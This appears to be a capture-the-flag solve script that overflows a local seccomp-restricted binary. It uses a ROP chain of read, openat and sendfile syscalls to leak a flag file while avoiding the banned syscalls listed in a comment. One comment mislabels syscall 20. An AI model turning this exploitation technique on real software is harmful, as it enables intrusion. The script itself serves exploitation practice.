from pwn import *
from icecream import ic

exe = ELF("./seccomp_patched")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x0000000000401daf
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

# Syscall numbers:
# openat 257
# read 0
# write 20

'''
Banned syscalls:

write
open
pwrite64
writev
clone
fork
vfork
execve
kill
ptrace
tkill
splice
pwritev
open_by_handle_at
getcpu
execveat
pwritev2

Use:

openat 257
read 0
writev 20
'''

syscall = 0x000000000041860c
pop_rax = 0x0000000000401daf
pop_rdi = 0x00000000004017b6
pop_rsi = 0x00000000004024f6
pop_rdx = 0x0000000000401db2
pop_r10 = 0x0000000000401db1
mov = 0x00000000004739b1
bss = 0x00000000004d1260 + 0x200

payload = b'a'*72
# payload += p64(pop_rsi)
# payload += p64(bss)
# payload += p64(pop_rax)
# payload += b'flag.txt'
# payload += p64(mov)

payload += p64(pop_rax)
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(bss)
payload += p64(pop_rdx)
payload += p64(200)
payload += p64(syscall)

# payload += p64(pop_rdi)
# payload += p64(3)
# payload += p64(pop_rax)
# payload += p64(40)
# payload += p64(pop_rsi)
# payload += p64(0)
# payload += p64(pop_rdx)
# payload += p64(0)
# payload += p64(pop_r10)
# payload += p64(200)
# payload += p64(syscall)

payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(257)
payload += p64(pop_rsi)
payload += p64(bss)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(pop_r10)
payload += p64(0)
payload += p64(syscall)

# payload += p64(pop_rdi)
# payload += p64(3)
# payload += p64(pop_rax)
# payload += p64(0)
# payload += p64(pop_rsi)
# payload += p64(bss+0x200)
# payload += p64(pop_rdx)
# payload += p64(200)
# payload += p64(syscall)

# payload += p64(pop_rdi)
# payload += p64(1)
# payload += p64(pop_rax)
# payload += p64(1)
# payload += p64(pop_rsi)
# payload += p64(bss)
# payload += p64(pop_rdx)
# payload += p64(1)
# payload += p64(syscall)

payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rax)
payload += p64(40)
payload += p64(pop_rsi)
payload += p64(3)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(pop_r10)
payload += p64(200)
payload += p64(syscall)

# payload += p64(pop_rdi)
# payload += p64(3)
# payload += p64(pop_rax)
# payload += p64(0)
# payload += p64(pop_rsi)
# payload += p64(bss+0x200)
# payload += p64(pop_rdx)
# payload += p64(200)
# payload += p64(syscall)

sl(payload)
sl(b'/mnt/c/Users/raman/Downloads/whitelist/flaaaaaag.txt\x00\x00\x00\x00')
i()
